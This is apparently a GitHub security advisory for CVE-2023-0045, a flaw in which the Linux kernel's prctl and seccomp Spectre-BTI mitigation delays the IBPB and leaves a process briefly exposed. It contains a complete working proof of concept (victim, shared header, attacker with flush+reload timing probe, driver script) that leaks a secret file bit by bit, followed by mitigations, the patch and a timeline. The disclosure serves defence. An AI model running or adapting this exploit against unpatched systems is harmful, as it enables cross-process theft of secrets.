---
title: 'Linux Kernel: Bypassing Spectre-BTI User Space Mitigations'
severity: Low
ghsa_id: GHSA-9x5g-vmxf-4qj8
cve_id: CVE-2023-0045
weaknesses: []
products:
- ecosystem: Linux
  package_name: Kernel
  affected_versions: < e8377f0456fb6738a4668d4df16c13d7599925fd
  patched_versions: e8377f0456fb6738a4668d4df16c13d7599925fd
cvss: null
credits:
- github_user_id: rrbranco
  name: Rodrigo Rubira Branco (BSDaemon)
  avatar: https://avatars.githubusercontent.com/u/610945?s=40&v=4
- github_user_id: es0j
  name: José Luiz
  avatar: https://avatars.githubusercontent.com/u/37257235?s=40&v=4
---

### Summary
When testing the success rate of Spectre-BTI attacks, we detected a strange pattern when using the kernel API as mitigation [[1](https://docs.kernel.org/userspace-api/spec_ctrl.html)]. Our tests revealed that the Linux kernel fails to correctly mitigate the attack leaving the process exposed for a short period of time after the syscall. 
Further investigation showed that the kernel does not issue an IBPB immediately during the syscall. The ```ib_prctl_set``` [[2](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467)] function updates the Thread Information Flags (TIFs) for the task and updates the SPEC_CTRL MSR on the function ```__speculation_ctrl_update``` [[3]([https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467])], but the IBPB is only issued on the next schedule, when the TIF bits are checked. This leaves the victim vulnerable to values already injected on the BTB, prior to the prctl syscall. The behavior is only corrected after a reschedule of the taks happens. Furthermore, the kernel entrance (due to the syscall itself), does not issue an IBPB in the default scenarios (i.e., when the kernel protects itself via retpoline or eIBRS).

Executing a prctl to mitigate spectre-BTI attacks using: ``` prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);```  leads to the``` ib_prctl_set``` [[2](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467)] function on kernel 5.15. When the option SPEC_DISABLE is used the TIF bit for  ```task_set_spec_ib_disable``` is set and ```task_update_spec_tif``` is called: 
``` 
static int ib_prctl_set(struct task_struct *task, unsigned long ctrl) [...] 
case PR_SPEC_FORCE_DISABLE: 
/* 
* Indirect branch speculation is always allowed when 
* mitigation is force disabled. 
*/ 
if (spectre_v2_user_ibpb == SPECTRE_V2_USER_NONE && 
spectre_v2_user_stibp == SPECTRE_V2_USER_NONE) 
return -EPERM; 
if (!is_spec_ib_user_controlled()) 
return 0; 
task_set_spec_ib_disable(task); 
if (ctrl == PR_SPEC_FORCE_DISABLE) 
task_set_spec_ib_force_disable(task); 
task_update_spec_tif(task); 
break; ```
```

```task_set_spec_ib_disable``` calls ```set_tsk_thread_flag(tsk, TIF_SPEC_FORCE_UPDATE);```  and if the target task is the current process it calls ``` speculation_ctrl_update_current(); ```

```
static void task_update_spec_tif(struct task_struct *tsk) 
{ 
/* Force the update of the real TIF bits */ 
set_tsk_thread_flag(tsk, TIF_SPEC_FORCE_UPDATE); 
/* 
* Immediately update the speculation control MSRs for the current * task, but for a non-current task delay setting the CPU 
* mitigation until it is scheduled next. 
* 
* This can only happen for SECCOMP mitigation. For PRCTL it's 
* always the current task. 
*/ 
if (tsk == current) 
speculation_ctrl_update_current(); 
} 
```

The ``` speculation_ctrl_update_current``` after the ```speculation_ctrl_update``` wrapper executes  ```__speculation_ctrl_update``` with ```tifp = ~tifp``` , here the update of the wrmsr for setting STIBP is executed but no IBPB is issued : 

```

static __always_inline void __speculation_ctrl_update(unsigned long tifp, unsigned long tifn)

{
unsigned long tif_diff = tifp ^ tifn;
u64 msr = x86_spec_ctrl_base;
bool updmsr = false;
lockdep_assert_irqs_disabled();
/* Handle change of TIF_SSBD depending on the mitigation method. */
if (static_cpu_has(X86_FEATURE_VIRT_SSBD)) {
if (tif_diff & _TIF_SSBD)
amd_set_ssb_virt_state(tifn);
} else if (static_cpu_has(X86_FEATURE_LS_CFG_SSBD)) {
if (tif_diff & _TIF_SSBD)
amd_set_core_ssb_state(tifn);

} else if (static_cpu_has(X86_FEATURE_SPEC_CTRL_SSBD) ||
static_cpu_has(X86_FEATURE_AMD_SSBD)) {
updmsr |= !!(tif_diff & _TIF_SSBD);
msr |= ssbd_tif_to_spec_ctrl(tifn);
}
/* Only evaluate TIF_SPEC_IB if conditional STIBP is enabled. */
if (IS_ENABLED(CONFIG_SMP) &&
static_branch_unlikely(&switch_to_cond_stibp)) {
updmsr |= !!(tif_diff & _TIF_SPEC_IB);
msr |= stibp_tif_to_spec_ctrl(tifn);
}
if (updmsr)
wrmsrl(MSR_IA32_SPEC_CTRL, msr);

}
```
The seccomp syscall also uses ```ib_prctl_set``` [[2](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467)] as mitigation, inside
```arch_seccomp_spec_mitigate ``` [[4]([https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467])] so the same result is expected with seccomp.

### Severity
Low - Severity justification currently being reworked.

### Proof of Concept
To ensure this wasn't a measurement error, we created a simple POC. The victim code always executes a```safe_function``` through a function pointer that is vulnerable to a spectre-BTI attack. The victim requests the kernel for protection using the prctl syscall (inside ```protect_me```). The victim also loads a secret from a text file, showing that other syscalls don’t check the TIF bit or provoke a reschedule that would force an IBPB.

```
//gcc -o victim victim.c -O0 -masm=intel -no-pie -fno-stack-protector
#include "common.h"

int main(int argc, char *argv[])
{

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("running victim %s\n", argv[1]);

    //only call safe_function
    codePtr = safe_function;
    char secret[20];
    char *sharedmem = open_shared_mem();
    unsigned idx = string_to_unsigned(argv[1]);

    //call for prctl to protect this process
    protect_me();

    //only then load the secret into memory
    load_secret(secret);

    for (int i = 0; i < 100; i++)
    {
        flush((char *)&codePtr);
        //this arguments are never used on safe_function, but they match the signature of spectre_gadget, that should never be called
        //Since prctl is called, it shouldn't be possible for an attacker to poison the BTB and leak the secret
        spec(&sharedmem[2000], secret, idx);
    }
}

```
Most of the libc functions were placed inside a common header between the attacker and the victim, so the ```spectre_gadget``` and ```spec``` functions share the same memory addresses on both victim and attacker (otherwise a .GOT entry is created and the addresses are changed). This is not a requirement and there are other ways to place the branches on the same addresses and mimic the victim context, but this method is the simplest.

```
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/prctl.h>

char unused[0x1000];
void (*codePtr)(char *, char *, unsigned idx);
char unused2[0x1000];

// this function does nothing. Always called by the victim
void safe_function(char *a, char *b, unsigned idx)
{
}

// this function is never called by the victim
void spectre_gadget(char *addr, char *secret, unsigned idx)
{
    volatile char d;
    if ((secret[idx / 8] >> (idx % 8)) & 1)
        d = *addr;
}

// helper for better results probably not necessary but makes the tests easier
void flush(char *adrs)
{
    asm volatile(
        "clflush [%0]                   \n"
        :
        : "c"(adrs)
        :);
}

// This function is vulnerable to a spectre-BTI attack.
void spec(char *addr, char *secret, unsigned idx)
{

    for (register int i = 0; i < 30; i++)
        ;
    codePtr(addr, secret, idx);
}

// opens file as read only in memory to be used as side channel, but could be any other COW file like libc for example
char *open_shared_mem()
{
    int fd = open("sharedmem", O_RDONLY);
    char *res = (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
    // ensure page is on memory
    volatile char d = res[2100];
    return res;
}

// load secret from file
void load_secret(char *secret)
{
    FILE *fp = fopen("secret.txt", "r");
    fgets(secret, 20, (FILE *)fp);
}

// Calls prctl to protect the user against spectre-BTI attacks - https://docs.kernel.org/userspace-api/spec_ctrl.html
void protect_me()
{
    usleep(1000); //not needed but resets the available time on scheduler
    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);
}

// Utility. All utility functions are placed on common so the spec function matches the same address on both victim and attacker. This is not necessary but makes the tests easier
unsigned string_to_unsigned(char *s)
{
    return atoi(s);
}

```

The attack consists in poisoning the BTB by calling the ```spec``` function and making it branch to ```spectre_gadget``` instead of ```safe_function```. After the training the victim process is created and it executes ```spec``` that mispredicts to ```spectre_gadget``` which should never be executed. The secret is leaked through a classic flush+reload side channel.

```
//gcc -o attacker attacker.c -O0 -masm=intel -no-pie -fno-stack-protector
#include "common.h"

#define PRINTNUM 1000

unsigned probe(char *adrs)
{
    volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
        "    mfence             \n"
        "    lfence             \n"
        : "=a"(time)
        : "c"(adrs)
        : "%esi", "%edx");
    return time;
}

int main(int argc, char *argv[])
{

    //Make spec function confuse safe_function with spectre_gadget
    codePtr = spectre_gadget;

    char dummy;
    int hits = 0;
    int tries = 0;
    char *sharedmem = open_shared_mem();
    setvbuf(stdout, NULL, _IONBF, 0);

    while (1)
    {
        //Inject the target in the BTB
        spec(&dummy, &dummy, 0);

        //Allow for victim to execute and misspredict to spectre_gadget
        usleep(1);

        //probe the 1-bit flush+reload side channel
        if (probe((char *)&sharedmem[2000]) < 0x90)
        {
            printf("+");
        }
    }
}
```

Since the victim receives an argument that can be used to choose the bit to be leaked through the side channel, we can execute the victim process multiple times while the attacker is executing:

```
taskset -c 0 ./attacker >> result.txt &

for i in {0..144}
do
    echo "Leaking bit $i... "
    echo -e -n "Leaking bit $i: " >> result.txt
    sleep .01
    for j in {0..10}
    do
        taskset -c 0 ./victim $i >/dev/null
    done

    echo "" >> result.txt
done

python3 parseResult.py 

make clean
echo -e "killing attacker"
kill -9 $(pidof attacker)
```

This leaves the following text file:
```
Leaking bit 0: +++++++++++
Leaking bit 1: 
Leaking bit 2: 
Leaking bit 3: 
Leaking bit 4: 
Leaking bit 5: 
Leaking bit 6: ++++++++++
Leaking bit 7: 
Leaking bit 8: ++++++++
[...]
```

Note that bit 0 and 6 are 1, therefore the first character must be 0x41(A). Parsing the file with a simple Python script shows:```The secret leaked is: b'Asuper_secret_flag' ```which is the exact content present in ```secret.txt``` used by the victim.
Changing the prctl call for seccomp to ```syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0);``` after loading the secret doesn't prevent the attack. This is expected since internally both use the same ```ib_prctl_set``` function to implement the mitigation.


### Further Analysis
The current implementation of the prctl syscall for speculative control fails to protect the user against attackers executing before the mitigation. The ```seccomp``` mitigation also fails in this scenario.
The patch that added support for the conditional mitigation via prctl (ib_prctl_set) dates back to the kernel 4.9.176. It appears to have been introduced on Nov 28, 2018 in the following commit: https://github.com/torvalds/linux/commit/9137bb27e60e554dab694eafa4cca241fa3a694f  and the current ```__speculation_ctrl_update``` code that sets the MSRs, but without the immediate IBPB, was added on the same day in the following commit: https://github.com/torvalds/linux/commit/01daf56875ee0cd50ed496a09b20eb369b45dfa5.  This indicates that the issue has been present in the kernel for about 4 years.

#### Mitigations
For user-mode applications, a ```usleep``` after the prctl call is enough to force a reschedule and ensure the correct mitigation. One possible kernel patch for this attack is to issue the IBPB just after the STIBP is set, on``` __speculation_ctrl_update```  [[[3]([https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467])](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c#L557)] or to call schedule().  After discussing with the Linux Kernel Security Team, that is what was decided, and the following commit has the fix: https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=a664ec9158eeddd75121d39c9a0758016097fa96. 

#### Patch 
This was addressed in the following [commit].(https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/x86/kernel/cpu/bugs.c?h=v6.1.9&id=e8377f0456fb6738a4668d4df16c13d7599925fd)
### Timeline
**Date reported**: 12/30/2022
**Date fixed**: 01/04/2023
**Date disclosed**: 02/03/2023